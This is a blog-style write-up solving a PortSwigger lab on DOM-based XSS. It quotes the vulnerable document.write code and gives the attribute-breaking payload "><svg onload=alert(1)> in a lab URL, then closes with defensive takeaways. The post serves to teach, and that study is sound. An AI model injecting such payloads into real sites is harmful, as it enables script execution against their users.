---
layout: post
title: "DOM XSS in document.write sink using location.search"
date: 2026-09-14

categories:
  - Web Security

topic: Cross-site scripting

tags:
  - PortSwigger
  - Cross-site scripting
  - Web Security Academy

toc: true
---

# Lab: DOM XSS in ```document.write``` sink using source ```location.search```

## Lab Information

- **Platform:** PortSwigger Web Security Academy
- **Tool:** Burp Suite
- **Difficulty:** Apprentice
- **Vulnerability:** Cross-site scripting
- **Status:** Solved ✓

## Lab Objective

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the javascript ```document.write``` function, which writes data out to the page. The ```document.write``` function is called with data from ```location.search```, which you can control using the website URL.

To solve the lab, perform a xss attack that calls the ```alert``` function.

## Cross-site scripting

Cross-site scripting is when a attacker injects malicious code/script into the website.It happens when website takes untrusted user input (like text from a form, URL parameter, search query, or comment field) and include it in page as it is without proper sanitization.
Now if an attacker upload any malicious code/script into website, it will not treat is as an plain text and put it in the codebase of website.

Common types are:

1. Stored(persistent) XSS
2. Reflected XSS
3. DOM-based XSS
   
## What is DOM-based XSS

DOM-based XSS occurs when client-side JavaScript takes data controlled by the attacker and uses it in an unsafe way to modify the webpage.

Unlike reflected XSS, the vulnerable behavior happens in the browser through JavaScript. In this lab, the search parameter from the URL is read using ```window.location.search``` and then passed to ```document.write()```.

## Exploitation

I inspected the page's JavaScript and found the following code:

```text
 function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
 }

 var query = (new URLSearchParams(window.location.search)).get('search');

 if (query) {
    trackSearch(query);
 }
```
The important part is:

```text
var query = (new URLSearchParams(window.location.search)).get('search');
```

The application reads the search parameter directly from the URL.

This value is then passed to:
```text
document.write(...)
```
The document.write() function inserts the supplied value into the page as HTML. Since the value is not safely encoded, it can be manipulated to inject HTML.

The application normally creates an image similar to:
```text
<img src="/resources/images/tracker.gif?searchTerms=SEARCH">
```
I used the following payload:
```text
"><svg onload=alert(1)>
```
The payload first closes the existing src attribute and the ```<img>``` element:
```text
">
```
Then it injects an SVG element containing an onload event:
```text
<svg onload=alert(1)>
```
I placed the payload in the search parameter of the lab URL:
```text
https://LAB-ID.web-security-academy.net/?search="><svg onload=alert(1)>
```
When the page processes the URL, the payload reaches document.write() and is interpreted as HTML by the browser.

The JavaScript in the onload event executes and an alert box appears, confirming the DOM-based XSS vulnerability and completing the lab.


![Reflected XSS into HTML context- Solved](/assets/images/portswigger/XSS/DOM-XSS.png)


## Key Takeaways

- DOM-based XSS occurs when client-side JavaScript handles attacker-controlled input unsafely.
- ```window.location.search``` can be a source of attacker-controlled input.
- ```document.write()``` can be a dangerous sink when untrusted input is inserted into HTML.
- Breaking out of an HTML attribute can allow injection of a new HTML element.
- URL parameters should always be treated as untrusted input.
- Safe DOM APIs and proper output encoding should be used when handling untrusted data.

**Lab Status: Solved ✓**
